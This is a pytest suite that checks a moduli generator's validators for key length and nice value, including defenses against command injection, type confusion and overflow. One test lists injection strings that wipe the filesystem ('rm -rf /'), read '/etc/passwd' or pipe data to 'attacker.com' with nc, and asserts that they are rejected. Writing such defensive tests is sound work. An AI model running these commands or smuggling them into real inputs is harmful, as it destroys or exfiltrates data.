"""
Pytest tests for parameter validation functionality.

This module tests the validation functions that ensure security and proper
input handling for the moduli generator, particularly focusing on preventing
command injection attacks.
"""

import pytest
from unittest.mock import patch

# Import the validation functions from the production module
from moduli_generator.validators import validate_integer_parameters, validate_subprocess_args


class TestValidateIntegerParameters:
    """Test cases for the validate_integer_parameters function."""

    @pytest.mark.unit
    @pytest.mark.security
    def test_valid_parameters(self):
        """Test validation with valid parameters."""
        # Test valid standard case
        key_length, nice_value = validate_integer_parameters(4096, 10)
        assert key_length == 4096
        assert nice_value == 10

        # Test valid string inputs
        key_length, nice_value = validate_integer_parameters("4096", "15")
        assert key_length == 4096
        assert nice_value == 15

        # Test valid negative nice value
        key_length, nice_value = validate_integer_parameters(3072, -5)
        assert key_length == 3072
        assert nice_value == -5

    @pytest.mark.unit
    @pytest.mark.security
    def test_none_parameters(self):
        """Test validation with None parameters."""
        key_length, nice_value = validate_integer_parameters(None, None)
        assert key_length is None
        assert nice_value is None

        # Test partial None
        key_length, nice_value = validate_integer_parameters(4096, None)
        assert key_length == 4096
        assert nice_value is None

        key_length, nice_value = validate_integer_parameters(None, 10)
        assert key_length is None
        assert nice_value == 10

    @pytest.mark.unit
    @pytest.mark.security
    def test_invalid_key_length_too_small(self):
        """Test validation fails for key length too small."""
        with pytest.raises(ValueError, match="key_length 256 is too small"):
            validate_integer_parameters(256, 10)

    @pytest.mark.unit
    @pytest.mark.security
    def test_invalid_key_length_too_large(self):
        """Test validation fails for key length too large."""
        with pytest.raises(ValueError, match="key_length 32768 is too large"):
            validate_integer_parameters(32768, 10)

    @pytest.mark.unit
    @pytest.mark.security
    def test_invalid_key_length_not_divisible_by_8(self):
        """Test validation fails for key length not divisible by 8."""
        with pytest.raises(ValueError, match="key_length 3073 must be divisible by 8"):
            validate_integer_parameters(3073, 10)

    @pytest.mark.unit
    @pytest.mark.security
    def test_invalid_key_length_not_numeric(self):
        """Test validation fails for non-numeric key length."""
        with pytest.raises(ValueError, match="key_length must be convertible to integer"):
            validate_integer_parameters("not_a_number", 10)

    @pytest.mark.unit
    @pytest.mark.security
    def test_invalid_key_length_wrong_type(self):
        """Test validation fails for wrong key length type."""
        with pytest.raises(TypeError, match="key_length must be an integer or string"):
            validate_integer_parameters([], 10)

    @pytest.mark.unit
    @pytest.mark.security
    def test_invalid_nice_value_too_high(self):
        """Test validation fails for nice value too high."""
        with pytest.raises(ValueError, match="nice_value 25 must be between -20 and 19"):
            validate_integer_parameters(4096, 25)

    @pytest.mark.unit
    @pytest.mark.security
    def test_invalid_nice_value_too_low(self):
        """Test validation fails for nice value too low."""
        with pytest.raises(ValueError, match="nice_value -25 must be between -20 and 19"):
            validate_integer_parameters(4096, -25)

    @pytest.mark.unit
    @pytest.mark.security
    def test_invalid_nice_value_not_numeric(self):
        """Test validation fails for non-numeric nice value."""
        with pytest.raises(ValueError, match="nice_value must be convertible to integer"):
            validate_integer_parameters(4096, "invalid")

    @pytest.mark.unit
    @pytest.mark.security
    def test_invalid_nice_value_wrong_type(self):
        """Test validation fails for wrong nice value type."""
        with pytest.raises(TypeError, match="nice_value must be an integer or string"):
            validate_integer_parameters(4096, {})

    @pytest.mark.unit
    @pytest.mark.security
    @pytest.mark.parametrize("key_length,nice_value,expected_key,expected_nice", [
        (4096, 10, 4096, 10),
        ("4096", "15", 4096, 15),
        (3072, -5, 3072, -5),
        (8192, 0, 8192, 0),
        ("7168", "-10", 7168, -10),
    ])
    def test_valid_parameter_combinations(self, key_length, nice_value, expected_key, expected_nice):
        """Test various valid parameter combinations."""
        result_key, result_nice = validate_integer_parameters(key_length, nice_value)
        assert result_key == expected_key
        assert result_nice == expected_nice


class TestValidateSubprocessArgs:
    """Test cases for the validate_subprocess_args function."""

    @pytest.mark.unit
    @pytest.mark.security
    def test_valid_subprocess_args(self):
        """Test subprocess validation with valid arguments."""
        safe_key, safe_nice = validate_subprocess_args(4096, 10)
        assert safe_key == "4096"
        assert safe_nice == "10"

        # Test with negative nice value
        safe_key, safe_nice = validate_subprocess_args(4096, -5)
        assert safe_key == "4096"
        assert safe_nice == "-5"

    @pytest.mark.unit
    @pytest.mark.security
    def test_subprocess_args_none_key_length(self):
        """Test subprocess validation fails when key_length is None."""
        with pytest.raises(ValueError, match="key_length is required for subprocess validation"):
            validate_subprocess_args(None, 10)

    @pytest.mark.unit
    @pytest.mark.security
    def test_subprocess_args_none_nice_value(self):
        """Test subprocess validation fails when nice_value is None."""
        with pytest.raises(ValueError, match="nice_value is required for subprocess validation"):
            validate_subprocess_args(4096, None)

    @pytest.mark.unit
    @pytest.mark.security
    def test_subprocess_args_invalid_parameters(self):
        """Test subprocess validation fails with invalid parameters."""
        # Test invalid key length
        with pytest.raises(ValueError, match="key_length 256 is too small"):
            validate_subprocess_args(256, 10)

        # Test invalid nice value
        with pytest.raises(ValueError, match="nice_value 25 must be between -20 and 19"):
            validate_subprocess_args(4096, 25)

    @pytest.mark.unit
    @pytest.mark.security
    def test_subprocess_args_string_safety(self):
        """Test that subprocess args are safe strings without special characters."""
        safe_key, safe_nice = validate_subprocess_args("4096", "10")

        # Verify they are strings
        assert isinstance(safe_key, str)
        assert isinstance(safe_nice, str)

        # Verify they match expected patterns
        import re
        assert re.match(r'^\d+$', safe_key)
        assert re.match(r'^-?\d+$', safe_nice)

    @pytest.mark.unit
    @pytest.mark.security
    @pytest.mark.parametrize("key_length,nice_value,expected_key,expected_nice", [
        (4096, 10, "4096", "10"),
        (4096, -5, "4096", "-5"),
        ("3072", "0", "3072", "0"),
        (8192, 19, "8192", "19"),
        ("7168", "-20", "7168", "-20"),
    ])
    def test_subprocess_args_parameter_combinations(self, key_length, nice_value, expected_key, expected_nice):
        """Test various valid subprocess argument combinations."""
        safe_key, safe_nice = validate_subprocess_args(key_length, nice_value)
        assert safe_key == expected_key
        assert safe_nice == expected_nice


class TestSecurityValidation:
    """Security-focused tests for parameter validation."""

    @pytest.mark.security
    def test_command_injection_prevention(self):
        """Test that validation prevents command injection attempts."""
        # These should all fail validation before reaching subprocess
        malicious_inputs = [
            "2048; rm -rf /",
            "2048 && cat /etc/passwd",
            "2048 | nc attacker.com 1234",
            "$(rm -rf /)",
            "`rm -rf /`",
            "2048\nrm -rf /",
            "2048\0rm -rf /",
        ]

        for malicious_input in malicious_inputs:
            with pytest.raises((ValueError, TypeError)):
                validate_integer_parameters(malicious_input, 10)

    @pytest.mark.security
    def test_type_confusion_prevention(self):
        """Test that validation prevents type confusion attacks."""
        # Test various non-string, non-int types
        invalid_types = [
            [],
            {},
            set(),
            lambda x: x,
            object(),
        ]

        for invalid_type in invalid_types:
            with pytest.raises(TypeError):
                validate_integer_parameters(invalid_type, 10)
            with pytest.raises(TypeError):
                validate_integer_parameters(4096, invalid_type)

    @pytest.mark.security
    def test_overflow_prevention(self):
        """Test that validation prevents integer overflow attacks."""
        # Test very large numbers that could cause overflow
        large_numbers = [
            2 ** 63,  # Large positive number
            -(2 ** 63),  # Large negative number
            float('inf'),  # Infinity
            float('-inf'),  # Negative infinity
        ]

        for large_num in large_numbers:
            with pytest.raises((ValueError, TypeError, OverflowError)):
                validate_integer_parameters(large_num, 10)
            with pytest.raises((ValueError, TypeError, OverflowError)):
                validate_integer_parameters(4096, large_num)

    @pytest.mark.security
    def test_boundary_values(self):
        """Test validation at boundary values."""
        # Test minimum valid key length
        key_length, nice_value = validate_integer_parameters(3072, 10)
        assert key_length == 3072

        # Test maximum valid key length
        key_length, nice_value = validate_integer_parameters(8192, 10)
        assert key_length == 8192

        # Test minimum valid nice value
        key_length, nice_value = validate_integer_parameters(4096, -20)
        assert nice_value == -20

        # Test maximum valid nice value
        key_length, nice_value = validate_integer_parameters(4096, 19)
        assert nice_value == 19

        # Test just outside boundaries should fail
        with pytest.raises(ValueError):
            validate_integer_parameters(3071, 10)  # One less than minimum
        with pytest.raises(ValueError):
            validate_integer_parameters(8193, 10)  # One more than maximum
        with pytest.raises(ValueError):
            validate_integer_parameters(4096, -21)  # One less than minimum
        with pytest.raises(ValueError):
            validate_integer_parameters(4096, 20)  # One more than maximum


class TestRegexValidationCoverage:
    """Tests to achieve 100% coverage of regex validation in validate_subprocess_args."""

    @pytest.mark.unit
    @pytest.mark.security
    def test_regex_validation_key_length_failure(self):
        """Test regex validation failure for key_length (line 91 coverage)."""
        # Mock re.match to return None for key_length regex check
        with patch('re.match') as mock_match:
            # First call (key_length check) returns None, second call (nice_value check) returns True
            mock_match.side_effect = [None, True]

            with pytest.raises(ValueError) as exc_info:
                validate_subprocess_args(4096, 10)
            assert "key_length contains invalid characters: 4096" in str(exc_info.value)

    @pytest.mark.unit
    @pytest.mark.security
    def test_regex_validation_nice_value_failure(self):
        """Test regex validation failure for nice_value (line 93 coverage)."""
        # Mock re.match to return True for key_length check, None for nice_value check
        with patch('re.match') as mock_match:
            # First call (key_length check) returns True, second call (nice_value check) returns None
            mock_match.side_effect = [True, None]

            with pytest.raises(ValueError) as exc_info:
                validate_subprocess_args(4096, 10)
            assert "nice_value contains invalid characters: 10" in str(exc_info.value)
